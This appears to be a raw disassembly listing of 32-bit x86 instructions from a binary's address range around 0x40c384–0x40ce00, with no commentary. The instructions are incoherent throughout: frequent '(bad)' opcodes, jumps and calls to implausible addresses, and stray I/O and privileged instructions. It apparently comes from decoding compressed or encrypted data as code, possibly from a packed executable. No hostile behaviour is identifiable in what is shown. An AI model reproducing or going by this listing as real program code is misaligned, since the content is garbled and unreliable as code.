  40c384:	sbb    dh,dl
  40c386:	cdq    
  40c387:	(bad)  
  40c388:	(bad)  
  40c389:	aas    
  40c38a:	dec    ebp
  40c38b:	fmul   DWORD PTR [eax-0x12fb59c]
  40c391:	pop    dx
  40c393:	sbb    eax,0x452d5ea6
  40c398:	add    cl,al
  40c39a:	or     al,0x35
  40c39c:	inc    ecx
  40c39d:	jmp    0x3f30d1ce
  40c3a2:	or     eax,0x51b4fed8
  40c3a7:	mov    edi,0x8044
	...
  40c3d4:	or     eax,0x166488d8
  40c3d9:	sar    dh,1
  40c3db:	es fcom st(6)
  40c3de:	data16 adc al,BYTE PTR [eax]
  40c3e1:	sbb    al,0x0
  40c3e3:	push   ss
  40c3e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3e5:	retf   
  40c3e6:	test   BYTE PTR [esi],0x6d
  40c3e9:	(bad)  
  40c3ea:	je     0x40c3e1
  40c3ec:	xor    eax,0x4cfea981
  40c3f1:	in     al,0x84
  40c3f3:	or     DWORD PTR [ebp-0x2a],eax
  40c3f6:	inc    BYTE PTR [ebx+0x43c9433d]
  40c3fc:	add    edx,edi
  40c3fe:	std    
  40c3ff:	xchg   esp,eax
  40c400:	sub    eax,0x2cd6fece
  40c405:	push   eax
  40c406:	or     al,0xc1
  40c408:	cmp    al,0x4
  40c40a:	inc    esi
  40c40c:	pop    edx
  40c40d:	loopne 0x40c3fa
  40c40f:	mov    dh,0xc
  40c411:	(bad)  
  40c412:	imul   ebp,ecx,0x2859a9a5
  40c418:	cmp    dl,dh
  40c41a:	mov    ah,0x99
  40c41c:	je     0x40c3f4
  40c41e:	(bad)  
  40c41f:	sahf   
  40c420:	mul    BYTE PTR [edx-0x18]
  40c423:	popf   
  40c424:	add    eax,0xb660fed6
  40c429:	ret    
  40c42a:	test   BYTE PTR [eax],0xc0
  40c42d:	mov    DWORD PTR [edx+0x0],ebp
  40c430:	das    
  40c431:	xchg   DWORD PTR [edx+0x41],ebx
  40c434:	xchg   edi,eax
  40c435:	mov    DWORD PTR [ebp+0xf0],esi
	...
  40c45f:	add    BYTE PTR [eax],al
  40c461:	add    BYTE PTR [eax],cl
  40c463:	mov    edi,edi
  40c465:	call   FWORD PTR [edx-0x3026192a]
  40c46b:	mov    edi,edi
  40c46d:	mov    edx,ebx
  40c46f:	and    eax,0xdcf0fff7
  40c474:	mov    esp,0xff8918e4
  40c479:	add    BYTE PTR [edx-0x8427e29],cl
  40c47f:	nop
  40c480:	(bad)  
  40c481:	call   DWORD PTR [edi+0xe]
  40c484:	and    DWORD PTR fs:[edx+0x50fff776],0x5a
  40c48c:	je     0x40c4ea
  40c48e:	xchg   esp,eax
  40c48f:	dec    ebx
  40c490:	call   0xc9f58c
  40c495:	je     0x40c44b
  40c497:	icebp  
  40c498:	(bad)  
  40c499:	inc    DWORD PTR [eax+0x4c]
  40c49c:	push   DWORD PTR [ebp+0x1f]
  40c49f:	jb     0x40c4dc
  40c4a1:	mov    ds:0xb5ff8c10,al
  40c4a6:	adc    edx,DWORD PTR [edi+edi*8+0x70e10ff]
  40c4ad:	call   0x400212
  40c4b2:	lock dec ebp
  40c4b4:	call   0xffccc5b0
  40c4b9:	jne    0x40c48a
  40c4bb:	jno    0x40c43e
  40c4bd:	mov    ds:0xb5ff8b90,al
  40c4c2:	sti    
  40c4c3:	xchg   ebx,eax
  40c4c4:	(bad)  
  40c4c5:	inc    DWORD PTR [eax]
	...
  40c4ef:	add    al,ah
  40c4f1:	or     eax,0x3d54e807
  40c4f6:	(bad)  
  40c4f7:	(bad)  
  40c4f8:	ds in  eax,dx
  40c4fa:	jbe    0x40c4dc
  40c4fc:	test   eax,0x13ff30e4
  40c501:	int3   
  40c502:	sbb    ah,BYTE PTR [ebp-0x24]
  40c505:	push   esp
  40c506:	xor    edi,edi
  40c508:	shr    edi,cl
  40c50a:	cmp    bh,bh
  40c50c:	add    DWORD PTR [edi+esi*4+0x7],0xff651466
  40c514:	jno    0x40c54a
  40c516:	ja     0x40c4fc
  40c518:	jno    0x40c546
  40c51a:	xor    eax,ebp
  40c51c:	daa    
  40c51d:	fbstp  TBYTE PTR [eax]
  40c51f:	call   FWORD PTR [ecx+0x56]
  40c522:	and    al,0xf7
  40c524:	push   ecx
  40c525:	xchg   esp,eax
  40c526:	sbb    al,0x2e
  40c528:	mov    ds:0x8bff318c,eax
  40c52d:	xchg   edi,eax
  40c52e:	cmp    edi,edi
  40c530:	cmp    DWORD PTR [ebx-0x1b],ebp
  40c533:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c534:	xor    DWORD PTR [esi+0x31],esi
  40c537:	mov    ch,0x16
  40c539:	jbe    0x40c56c
  40c53b:	call   DWORD PTR [esi]
  40c53d:	retf   
  40c53e:	call   FWORD PTR gs:[ecx]
  40c541:	pop    esi
  40c542:	ja     0x40c520
  40c544:	or     esi,edx
  40c546:	das    
  40c547:	call   0xff71ec87
  40c54c:	add    DWORD PTR [eax-0x420608cc],edx
  40c552:	das    
  40c553:	jne    0x40c555
	...
  40c57d:	add    BYTE PTR [edx-0x4b],al
  40c580:	mov    ch,0x7
  40c582:	(bad)  
  40c583:	outs   dx,DWORD PTR ds:[esi]
  40c584:	xor    bh,bh
  40c586:	loope  0x40c52d
  40c588:	jne    0x40c57a
  40c58a:	rcr    DWORD PTR [ebp-0x213017d1],1
  40c590:	das    
  40c591:	dec    ecx
  40c593:	xchg   DWORD PTR [ecx+ebp*8],ebp
  40c596:	outs   dx,DWORD PTR ds:[esi]
  40c597:	add    al,0x30
  40c599:	(bad)  
  40c59a:	mov    ecx,0xa6301c5b
  40c59f:	data16 js 0x40c5a5
  40c5a2:	mov    ds:0x2fa1ffaa,al
  40c5a8:	bound  ebx,QWORD PTR [edi]
  40c5aa:	mov    ebp,0x919d849f
  40c5af:	inc    edx
  40c5b0:	(bad)  
  40c5b1:	xor    BYTE PTR [ebx],dl
  40c5b3:	arpl   WORD PTR [ecx+0x6dd4dc04],ax
  40c5b9:	jp     0x40c5be
  40c5bb:	xlat   BYTE PTR ds:[ebx]
  40c5bc:	rol    BYTE PTR [esi],1
  40c5be:	adc    eax,0x3330e91a
  40c5c3:	scas   al,BYTE PTR es:[edi]
  40c5c4:	mov    al,ds:0xd3d561c2
  40c5c9:	sti    
  40c5ca:	popa   
  40c5cb:	int    0x43
  40c5cd:	xor    BYTE PTR [ecx+0x43],dl
  40c5d0:	in     al,0xcc
  40c5d2:	(bad)  
  40c5d3:	pop    edx
  40c5d4:	rol    DWORD PTR ds:0x30695b3e,0xb3
  40c5db:	arpl   WORD PTR [ecx],dx
  40c5dd:	daa    
  40c5de:	xor    edx,esp
  40c5e0:	sbb    eax,0x30
	...
  40c609:	add    BYTE PTR [eax],al
  40c60b:	add    BYTE PTR [ebx+0x39b615d7],dh
  40c611:	ret    
  40c612:	mul    BYTE PTR [ebp+0x19]
  40c615:	aam    0x2f
  40c617:	inc    ebp
  40c618:	cmp    bl,BYTE PTR [ebx-0x6c]
  40c61b:	jl     0x40c637
  40c61d:	fisubr DWORD PTR [edi+ebx*1]
  40c620:	or     esp,edx
  40c622:	in     eax,dx
  40c623:	jge    0x40c5a8
  40c625:	xlat   BYTE PTR ds:[ebx]
  40c626:	cmp    BYTE PTR [edi],ch
  40c628:	imul   ebp,DWORD PTR [ebx-0x22],0xffffffb9
  40c62c:	xor    eax,0x3e9486c3
  40c631:	pop    ebx
  40c632:	loop   0x40c677
  40c634:	dec    ecx
  40c635:	fidiv  WORD PTR [ebp+0x4]
  40c638:	ds pop ebx
  40c63a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c63b:	leave  
  40c63c:	rcr    DWORD PTR [edx+0x0],1
  40c63f:	jmp    0x25082181
  40c644:	jbe    0x40c61a
  40c646:	push   es
  40c647:	jmp    0x13410789
  40c64c:	inc    edx
  40c64d:	inc    ecx
  40c64e:	add    BYTE PTR [ebx],al
  40c650:	cmp    ah,dh
  40c652:	inc    esp
  40c653:	xchg   ebp,eax
  40c654:	jb     0x40c63c
  40c656:	test   BYTE PTR [ebp+0x49],bh
  40c659:	aam    0xfe
  40c65b:	sbb    DWORD PTR [ecx+0x4e],ebx
  40c65e:	clc    
  40c65f:	jbe    0x40c628
  40c661:	iret   
  40c662:	out    0x4f,eax
  40c664:	rcr    BYTE PTR [edx+0x0],cl
  40c667:	repnz std 
  40c669:	dec    esi
  40c66a:	add    dl,BYTE PTR [edx-0x79]
  40c66d:	out    0x84,al
  40c66f:	inc    ebp
	...
  40c698:	add    BYTE PTR [eax],al
  40c69a:	sub    esp,edx
  40c69c:	(bad)  
  40c69d:	mov    ecx,0x3ef3ddbe
  40c6a2:	and    esp,edx
  40c6a4:	dec    edi
  40c6a5:	xchg   DWORD PTR ds:[ebx-0x1],esp
  40c6a9:	mov    esp,0x8640bb41
  40c6ae:	imul   edx,edx,0xca6a6c88
  40c6b4:	(bad)  
  40c6b5:	push   ds
  40c6b6:	and    eax,0xbccb7413
  40c6bb:	adc    ah,ch
  40c6bd:	push   ss
  40c6be:	imul   edx,edx,0x43427cff
  40c6c4:	add    cl,ch
  40c6c6:	sub    BYTE PTR [ecx],dl
  40c6c8:	(bad)  
  40c6c9:	cmp    al,0x5e
  40c6cb:	retf   0xeefe
  40c6ce:	sub    BYTE PTR [eax],cl
  40c6d0:	lock fisub WORD PTR [eax]
  40c6d3:	sar    dh,cl
  40c6d5:	push   esp
  40c6d6:	jmp    0xfed2:0x10a0b4ba
  40c6dd:	xchg   esp,eax
  40c6de:	or     eax,0xf800feca
  40c6e3:	jbe    0x40c6d7
  40c6e5:	mov    ds:0x45ff8188,eax
  40c6ea:	(bad)  
  40c6eb:	jne    0x40c66d
  40c6ed:	push   DWORD PTR [edx-0x75]
  40c6f0:	call   0x9efe06
  40c6f5:	leave  
  40c6f6:	aad    0xd2
  40c6f8:	(bad)  
  40c6f9:	push   esp
  40c6fa:	sbb    al,0x72
  40c6fc:	add    esp,0x0
	...
  40c727:	add    bl,cl
  40c729:	hlt    
  40c72a:	(bad)  
  40c72b:	imul   ebx,DWORD PTR [edi-0x50f78a7f],0x8ffa159
  40c735:	dec    edi
  40c736:	inc    ebp
  40c737:	cld    
  40c738:	aas    
  40c739:	mov    ch,0x59
  40c73b:	inc    ecx
  40c73c:	xor    DWORD PTR [di],0xfe97afd5
  40c743:	inc    BYTE PTR [edx+0x825e6d6]
  40c749:	cmp    edi,0x3fa62d68
  40c74f:	add    BYTE PTR [edi+0x5c],ch
  40c752:	add    BYTE PTR [eax],al
  40c754:	xlat   BYTE PTR ds:[ebx]
  40c755:	xor    BYTE PTR [ebp+0x8],0x7f
  40c759:	ins    DWORD PTR es:[edi],dx
  40c75a:	(bad)  
  40c75b:	call   FWORD PTR [eax-0xa]
  40c75e:	inc    ecx
  40c75f:	pop    ebx
  40c760:	(bad)  
  40c761:	pop    ebp
  40c762:	push   DWORD PTR ds:0x401662
  40c768:	dec    eax
  40c769:	adc    eax,DWORD PTR [edi]
  40c76b:	call   0x404897
  40c770:	scas   eax,DWORD PTR es:[edi]
  40c771:	pushf  
  40c772:	pop    ecx
  40c773:	inc    ecx
  40c774:	pop    ss
  40c775:	test   BYTE PTR [eax],0x0
  40c778:	out    0xdd,eax
  40c77a:	(bad)  
  40c77b:	jne    0x40c76c
  40c77d:	jne    0x40c76d
  40c77f:	dec    BYTE PTR [eax]
  40c781:	cmp    bh,0x75
  40c784:	ds test al,0x2c
  40c787:	jne    0x40c7cf
  40c789:	pushf  
  40c78a:	mov    al,ss:0x0
	...
  40c7b4:	add    BYTE PTR [eax],al
  40c7b6:	rcr    DWORD PTR [eax-0x3bbd3dc6],1
  40c7bc:	aad    0x8a
  40c7be:	ror    BYTE PTR [eax],cl
  40c7c0:	mov    bh,0xb
  40c7c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7c3:	add    esp,DWORD PTR [ebp-0x1]
  40c7c6:	mov    cl,0xcc
  40c7c8:	inc    edx
  40c7c9:	je     0x40c7c3
  40c7cb:	imul   esi,DWORD PTR [eax-0x2d3c00a6],0xffffffe7
  40c7d2:	or     bl,BYTE PTR [ecx]
  40c7d4:	sub    eax,0xd473eeff
  40c7d9:	les    ebx,FWORD PTR ds:[bp+di]
  40c7dd:	mov    esi,0x40c96216
  40c7e2:	ds je  0x40c812
  40c7e5:	jne    0x40c82d
  40c7e7:	sub    al,0xf7
  40c7e9:	retf   
  40c7ea:	imul   esi,DWORD PTR [eax],0xc43f67cc
  40c7f0:	sbb    edi,DWORD PTR [esi+0x40c79ce6]
  40c7f6:	ds hlt 
  40c7f8:	sub    esi,DWORD PTR [ebp+0x36]
  40c7fb:	sub    al,0xe3
  40c7fd:	retf   
  40c7fe:	inc    ecx
  40c7ff:	mov    ah,cl
  40c801:	addr16 cmp al,0xc2
  40c804:	sbb    edi,DWORD PTR [esi+0x40c7f2a6]
  40c80a:	adc    ch,BYTE PTR ds:[esi*2-0x3400a5ca]
  40c812:	sbb    DWORD PTR [edx+0x1c],esp
  40c815:	push   ss
  40c816:	fstp   QWORD PTR [ecx+0x2d]
  40c819:	leave  
	...
  40c842:	add    BYTE PTR [eax],al
  40c844:	cld    
  40c845:	retf   0x5502
  40c848:	mov    ch,0x56
  40c84a:	add    esp,0x6a02dcfa
  40c850:	push   edi
  40c851:	pop    ebx
  40c852:	out    0xb6,al
  40c854:	inc    ecx
  40c855:	ret    
  40c856:	and    BYTE PTR [ecx+eiz*8-0x30],ah
  40c85a:	pop    edi
  40c85b:	(bad)  
  40c85c:	aad    0x45
  40c85e:	repz sub al,0x4b
  40c861:	arpl   cx,dx
  40c863:	or     ecx,0xffffffd0
  40c866:	mov    ebp,0x3bd01c99
  40c86b:	cld    
  40c86c:	mov    eax,ds:0xb12cae49
  40c871:	inc    ebp
  40c872:	add    eax,0x9163332d
  40c877:	lahf   
  40c878:	mov    al,ds:0x132c95d0
  40c87d:	iret   
  40c87e:	lea    esi,[esi+0x641ac339]
  40c884:	mov    eax,edx
  40c886:	scas   eax,DWORD PTR es:[edi]
  40c887:	inc    ecx
  40c888:	cmp    bl,BYTE PTR [ebx+0x1c]
  40c88b:	jns    0x40c8f7
  40c88d:	fsub   QWORD PTR [edi+ebp*1+0x1bf54671]
  40c894:	inc    esp
  40c895:	clc    
  40c896:	pop    ebp
  40c897:	sub    al,0x35
  40c899:	fwait
  40c89a:	in     eax,0x87
  40c89c:	popf   
  40c89d:	pop    ebx
  40c89e:	jmp    0x45578fa6
  40c8a3:	or     bl,0x6a
  40c8a6:	jmp    0x40c962
	...
  40c8cf:	add    BYTE PTR [eax],al
  40c8d1:	add    BYTE PTR [ebx],dh
  40c8d3:	sar    BYTE PTR [ebx+0x2d463913],1
  40c8d9:	sbb    edx,edi
  40c8db:	clc    
  40c8dc:	and    eax,0x1d15b72c
  40c8e1:	fwait
  40c8e2:	enter  0xa833,0x3
  40c8e6:	sbb    DWORD PTR [esi+0xd],eax
  40c8e9:	sbb    ecx,DWORD PTR [ebx-0x7]
  40c8ec:	add    eax,0xe9436e2c
  40c8f1:	add    edx,DWORD PTR [ecx]
  40c8f3:	adc    DWORD PTR [eax],eax
  40c8f5:	cdq    
  40c8f6:	sub    al,BYTE PTR [esi+0x8]
  40c8f9:	add    ecx,ecx
  40c8fb:	mov    ds:0xdd4ae6fe,al
  40c900:	mov    eax,ds:0xc54315de
  40c905:	xor    al,BYTE PTR [ebx]
  40c907:	sar    ch,1
  40c909:	push   esp
  40c90a:	es ret 
  40c90c:	adc    ecx,DWORD PTR [edi+0x514fd015]
  40c912:	cmp    ebx,DWORD PTR [ebx-0x11]
  40c915:	ja     0x40c8a9
  40c917:	shl    BYTE PTR [ecx+eiz*8+0x55],1
  40c91b:	dec    esp
  40c91c:	enter  0x55a6,0xc3
  40c920:	pusha  
  40c921:	dec    ebx
  40c922:	push   ebp
  40c923:	shl    BYTE PTR [edi+0x42],1
  40c926:	mov    DWORD PTR [edx],ebx
  40c928:	add    BYTE PTR [esi+0x7ae7d3cf],cl
  40c92e:	pop    ds
  40c92f:	sar    dh,1
  40c931:	sbb    DWORD PTR [edx+0x86fecf],esp
	...
  40c95f:	add    ah,ah
  40c961:	sub    bh,bh
  40c963:	hlt    
  40c964:	jne    0x40c91d
  40c966:	push   ecx
  40c967:	xor    DWORD PTR ds:0xdba9e7d0,edx
  40c96d:	iret   
  40c96e:	inc    cl
  40c970:	add    DWORD PTR [ecx+eax*2],esi
  40c973:	jmp    0x523d0f9c
  40c978:	lock cmc 
  40c97a:	(bad)  
  40c97b:	ds push 0x37
  40c97e:	add    ecx,ebp
  40c980:	push   esp
  40c981:	or     eax,0x56ef2e50
  40c986:	call   0xff0f2f63
  40c98b:	adc    DWORD PTR ds:0x6516fef9,esi
  40c991:	dec    eax
  40c992:	cld    
  40c993:	add    DWORD PTR ds:0x4000fef9,ebp
  40c999:	nop
  40c99a:	ret    0x170c
  40c99d:	lods   al,BYTE PTR ds:[esi]
  40c99e:	mov    esp,ebp
  40c9a0:	fs sbb edi,esp
  40c9a3:	push   0xffffffe7
  40c9a5:	lock sbb bh,bh
  40c9a8:	mov    cl,bh
  40c9aa:	out    0x39,al
  40c9ac:	pusha  
  40c9ad:	cmp    edi,0x6a832a89
  40c9b3:	add    BYTE PTR [ebp+0x5d],bh
  40c9b6:	push   DWORD PTR [ebp-0x31]
  40c9b9:	jb     0x40c9dd
  40c9bb:	inc    DWORD PTR [eax-0x2ff957f]
  40c9c1:	mov    ch,0xfd
  40c9c3:	jne    0x40c9c5
	...
  40c9ed:	add    BYTE PTR [edi-0x1f00e98e],bl
  40c9f3:	sub    DWORD PTR [edx+0x0],0x75ff634d
  40c9fa:	lahf   
  40c9fb:	jb     0x40ca07
  40c9fd:	inc    eax
  40c9ff:	sub    DWORD PTR [eax-0x7],0x69fe985c
  40ca06:	popf   
  40ca07:	xor    DWORD PTR [ebp+0x8],0xfffe7dbf
  40ca0e:	loopne 0x40ca01
  40ca10:	neg    DWORD PTR [ebx-0x6a]
  40ca13:	pop    edx
  40ca14:	push   0x23
  40ca16:	add    BYTE PTR [ebx],cl
  40ca18:	pop    es
  40ca19:	call   0x404e21
  40ca1e:	jg     0x40ca9f
  40ca20:	pop    ebx
  40ca21:	inc    ecx
  40ca22:	push   edi
  40ca23:	lock sbb bh,bh
  40ca26:	mov    dl,dl
  40ca28:	out    0xdd,al
  40ca2a:	jno    0x40c9ad
  40ca2c:	(bad)  
  40ca2d:	(bad)  
  40ca2e:	jmp    0x2072:0x2f75ff75
  40ca35:	lahf   
  40ca36:	inc    eax
  40ca37:	or     ecx,0x2c03ec2
  40ca3d:	push   ebp
  40ca3e:	(bad)
  40ca41:	les    edx,FWORD PTR [esi]
  40ca43:	int    0x28
  40ca45:	push   DWORD PTR [ebx-0x6afd90a]
  40ca4b:	dec    esi
  40ca4c:	adc    edi,edi
  40ca4e:	imul   esi,DWORD PTR [eax+0xb81a],0x0
	...
  40ca79:	add    BYTE PTR [eax],al
  40ca7b:	add    BYTE PTR [ebx-0x1f4fd3d],bh
  40ca81:	mov    esp,0xc43f477d
  40ca86:	add    al,bh
  40ca88:	jnp    0x40ca36
  40ca8a:	add    eax,DWORD PTR [eax]
  40ca8c:	les    edi,FWORD PTR ds:[edi]
  40ca8f:	inc    ebp
  40ca90:	retf   0x10c
  40ca93:	add    BYTE PTR [esi],bh
  40ca95:	sbb    al,BYTE PTR [edx+ebp*2]
  40ca98:	sbb    al,BYTE PTR ds:[edx+ebp*2]
  40ca9c:	ds inc edi
  40ca9e:	mov    edi,0x7f3f0ef3
  40caa3:	hlt    
  40caa4:	xchg   ecx,eax
  40caa5:	in     al,0x28
  40caa7:	push   eax
  40caa8:	xchg   ecx,eax
  40caa9:	data16 sub al,0xff
  40caac:	adc    ebx,eax
  40caae:	sbb    ecx,DWORD PTR [edx+0xb02c3b3]
  40cab4:	jle    0x40ca85
  40cab6:	std    
  40cab7:	call   0x438e00
  40cabc:	(bad)  
  40cabd:	repnz mov ebx,0xaf2d3e40
  40cac3:	pcmpgtd mm1,QWORD PTR [eax+0x1351ff60]
  40caca:	jl     0x40ca9c
  40cacc:	mov    ebx,0x41f7303e
  40cad1:	mov    esp,ss
  40cad3:	push   ecx
  40cad4:	es jp  0x40cb37
  40cad7:	push   DWORD PTR [ecx]
  40cad9:	cmp    al,0x7f
  40cadb:	lock xor DWORD PTR [esi+eiz*1+0x29],ebx
	...
  40cb08:	add    BYTE PTR [eax],al
  40cb0a:	push   ss
  40cb0b:	jnp    0x40cb55
  40cb0d:	sub    DWORD PTR [ecx],ebx
  40cb0f:	inc    edx
  40cb10:	jmp    0xa87034b0
  40cb15:	add    ecx,DWORD PTR [ecx]
  40cb17:	pop    es
  40cb18:	stc    
  40cb19:	xor    BYTE PTR [ecx],al
  40cb1b:	int    0xfd
  40cb1d:	scas   al,BYTE PTR es:[edi]
  40cb1e:	inc    ebp
  40cb1f:	ret    
  40cb20:	int3   
  40cb21:	pop    edi
  40cb22:	icebp  
  40cb23:	int3   
  40cb24:	pop    edi
  40cb25:	jg     0x40cb01
  40cb27:	(bad)  
  40cb28:	in     eax,0x28
  40cb2a:	push   esp
  40cb2b:	pop    ebx
  40cb2c:	push   ecx
  40cb2d:	mov    al,ds:0x28e91a75
  40cb32:	mov    ecx,ebx
  40cb34:	aad    0x28
  40cb36:	leave  
  40cb37:	int3   
  40cb38:	cmp    edi,eax
  40cb3a:	fldenv [edx-0x7b]
  40cb3d:	sub    BYTE PTR [ecx-0x56e4941e],bh
  40cb43:	int3   
  40cb44:	lods   eax,DWORD PTR ds:[esi]
  40cb45:	test   bl,ch
  40cb47:	mov    edi,0x5ba1289d
  40cb4c:	adc    eax,0xe95b21f4
  40cb51:	sbb    al,dl
  40cb53:	inc    ebx
  40cb54:	leave  
  40cb55:	(bad)  
  40cb56:	(bad)  
  40cb57:	pop    edx
  40cb58:	xchg   BYTE PTR [esi-0x6e],ch
  40cb5b:	les    edi,FWORD PTR [ebp+0x28]
  40cb5e:	jns    0x40cba6
  40cb60:	loope  0x40cb7d
  40cb62:	mov    dl,0xa2
  40cb64:	ins    DWORD PTR es:[edi],dx
  40cb65:	sub    dh,dl
  40cb67:	pop    ecx
  40cb68:	jmp    0x13846b85
  40cb6d:	enter  0x0,0x0
	...
  40cb95:	add    BYTE PTR [eax],al
  40cb97:	add    dh,bh
  40cb99:	pop    edx
  40cb9a:	push   esi
  40cb9b:	outs   dx,BYTE PTR ds:[esi]
  40cb9c:	(bad)  
  40cb9d:	les    ecx,FWORD PTR [ebp+0x28]
  40cba0:	dec    ecx
  40cba1:	inc    esi
  40cba2:	icebp  
  40cba3:	sbb    ebx,DWORD PTR [edx-0x42d7c25e]
  40cba9:	or     eax,0xcc6e4100
  40cbae:	(bad)  
  40cbaf:	jmp    0xe9a9478d
  40cbb4:	cmp    eax,0x1d91bdbc
  40cbb9:	xor    BYTE PTR [ecx-0x17],al
  40cbbc:	pushw  es
  40cbbe:	call   0xff0d21d9
  40cbc3:	jl     0x40cbca
  40cbc5:	mov    ah,0x82
  40cbc7:	xor    BYTE PTR [esi],ah
  40cbc9:	int3   
  40cbca:	addr16 call 0x81fe880d
  40cbd0:	or     esi,DWORD PTR [eax]
  40cbd2:	inc    ecx
  40cbd3:	jmp    0xd728d1f0
  40cbd8:	and    esp,ecx
  40cbda:	(bad)  
  40cbdb:	pop    esp
  40cbdc:	shl    BYTE PTR [ebx-0x33de5f96],cl
  40cbe2:	(bad)  
  40cbe3:	jl     0x40cc0b
  40cbe5:	(bad)  
  40cbe6:	(bad)  
  40cbe7:	mov    esi,0xb6a03d5a
  40cbec:	pop    ecx
  40cbed:	int3   
  40cbee:	mov    ah,0xc1
  40cbf0:	pop    ecx
  40cbf1:	int3   
  40cbf2:	(bad)  
  40cbf3:	xchg   ecx,eax
  40cbf4:	fucomp st(3)
  40cbf6:	(bad)  
  40cbf7:	sahf   
  40cbf8:	popa   
  40cbf9:	push   es
  40cbfa:	lock sahf 
	...
  40cc24:	add    BYTE PTR [eax],al
  40cc26:	pop    ecx
  40cc27:	int3   
  40cc28:	(bad)  
  40cc29:	adc    al,0x86
  40cc2b:	int3   
  40cc2c:	je     0x40cc1f
  40cc2e:	and    eax,0x217efe07
  40cc33:	int3   
  40cc34:	mov    ah,0x79
  40cc36:	and    esp,ecx
  40cc38:	inc    BYTE PTR [ecx+0x66feeba9]
  40cc3e:	sbb    DWORD PTR [esi],edx
  40cc40:	clc    
  40cc41:	push   eax
  40cc42:	sbb    cl,ch
  40cc44:	(bad)  
  40cc45:	push   esi
  40cc46:	sbb    DWORD PTR [esi-0x4],eax
  40cc49:	inc    ecx
  40cc4a:	popf   
  40cc4b:	(bad)  
  40cc4d:	call   DWORD PTR [edi-0x72]
  40cc50:	ret    0x270c
  40cc53:	lods   al,BYTE PTR ds:[esi]
  40cc54:	mov    esp,ebp
  40cc56:	push   0x97e80b0c
  40cc5b:	cmp    edi,edi
  40cc5d:	jmp    FWORD PTR [edi+ebx*1]
  40cc60:	je     0x40cc9b
  40cc62:	scas   eax,DWORD PTR es:[edi]
  40cc63:	mov    edx,0xaf27415a
  40cc68:	out    0xc,al
  40cc6a:	add    DWORD PTR [edx-0x1958af01],0xfffffffe
  40cc71:	dec    DWORD PTR [eax+0x41]
  40cc74:	push   0xfe9fcb20
  40cc79:	dec    edi
  40cc7a:	fmul   DWORD PTR [ebx]
  40cc7c:	pop    es
  40cc7d:	call   0x405383
  40cc82:	jg     0x40cc6b
  40cc84:	(bad)  
  40cc85:	(bad)  
  40cc86:	clc    
  40cc87:	inc    eax
  40cc88:	push   0x2a
	...
  40ccb1:	add    BYTE PTR [eax],al
  40ccb3:	add    BYTE PTR [ebx],bl
  40ccb5:	mov    al,ds:0xbf84ffe
  40ccba:	pop    es
  40ccbb:	call   0x405345
  40ccc0:	jg     0x40cd27
  40ccc2:	lahf   
  40ccc3:	(bad)  
  40ccc4:	fadd   DWORD PTR [edi-0x5468f73e]
  40ccca:	mov    esp,ebp
  40cccc:	and    al,0x8a
  40ccce:	cld    
  40cccf:	push   esi
  40ccd0:	push   eax
  40ccd1:	in     eax,0xfe
  40ccd3:	imul   ecx,DWORD PTR [ecx+eax*4-0x3a50f78b],0x46f8ff9b
  40ccde:	inc    ebp
  40ccdf:	cld    
  40cce0:	fmul   st(2),st
  40cce2:	push   edi
  40cce3:	dec    eax
  40cce4:	push   ss
  40cce5:	pop    edi
  40cce6:	mov    edi,DWORD PTR ds:0x40067a
  40ccec:	out    0xc0,eax
  40ccee:	dec    BYTE PTR [esi]
  40ccf0:	cmp    BYTE PTR ds:[edx+0x0],ch
  40ccf4:	ds mov ah,0x9a
  40ccf7:	adc    al,0xe2
  40ccf9:	repnz add dl,BYTE PTR [esi+0x26]
  40ccfd:	shl    BYTE PTR [esi+0x0],cl
  40cd00:	ds mov ebp,0xf4787442
  40cd06:	cmp    BYTE PTR [eax],0x3e
  40cd09:	sar    DWORD PTR [esi-0x79],1
  40cd0c:	ds mov ah,0x2
  40cd0f:	push   eax
  40cd10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd11:	mov    esi,0x985c3e40
  40cd17:	mov    DWORD PTR [eax],eax
	...
  40cd41:	add    BYTE PTR [esi],bh
  40cd43:	mov    ah,0xc8
  40cd45:	add    bh,ah
  40cd47:	jecxz  0x40cd63
  40cd49:	pusha  
  40cd4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd4b:	shl    BYTE PTR [eax+edx*2],1
  40cd4e:	mov    ds,esp
  40cd50:	add    al,BYTE PTR [eax]
  40cd52:	rol    DWORD PTR [ecx],1
  40cd54:	pushf  
  40cd55:	pop    ds
  40cd56:	jp     0x40cdcb
  40cd58:	add    al,0x50
  40cd5a:	shl    DWORD PTR [esi],1
  40cd5c:	cld    
  40cd5d:	out    0x55,eax
  40cd5f:	cld    
  40cd60:	and    al,0xff
  40cd62:	data16 sub al,0x3
  40cd65:	add    BYTE PTR [ecx+0x12299c49],ch
  40cd6b:	jae    0x40cd71
  40cd6d:	push   eax
  40cd6e:	test   eax,0x9e7fc8e
  40cd73:	or     al,0x25
  40cd75:	jmp    DWORD PTR [esi-0x6e007aad]
  40cd7b:	fadd   st(0),st
  40cd7d:	cmp    edi,DWORD PTR [bx+si-0x3d]
  40cd81:	(bad)  
  40cd82:	call   0x3ecc0a72
  40cd87:	mov    ah,0xf7
  40cd89:	mov    edi,0xe7cd07ea
  40cd8e:	inc    ebp
  40cd8f:	sbb    esp,DWORD PTR ds:0xb95b0eff
  40cd95:	fwait
  40cd96:	pop    ecx
  40cd97:	leave  
  40cd98:	dec    ebp
  40cd99:	data16 out 0x7a,al
  40cd9c:	mov    ch,0xc2
  40cd9e:	dec    ecx
  40cd9f:	sbb    DWORD PTR [esi-0x51],ecx
  40cda2:	cmp    DWORD PTR [ebx+0x3c0e],esi
	...
  40cdd0:	cmp    ecx,ecx
  40cdd2:	mov    al,ds:0x465b3e9b
  40cdd7:	xchg   si,ax
  40cdd9:	jne    0x40cd68
  40cddb:	ret    0x1921
  40cdde:	es scas eax,DWORD PTR es:[edi]
  40cde0:	inc    ecx
  40cde1:	mov    bl,0xfa
  40cde3:	cmp    edx,DWORD PTR [ecx]
  40cde5:	leave  
  40cde6:	add    BYTE PTR [ecx],cl
  40cde8:	test   eax,0x3f190dc8
  40cded:	and    DWORD PTR [ecx-0x1a],ebp
  40cdf0:	stc    
  40cdf1:	dec    edi
  40cdf2:	add    edi,DWORD PTR [esi+0x6b298cf5]
  40cdf8:	jmp    0xec65bbc5
  40cdfd:	stc    
  40cdfe:	and    ch,bh
  40ce00:	dec    eax
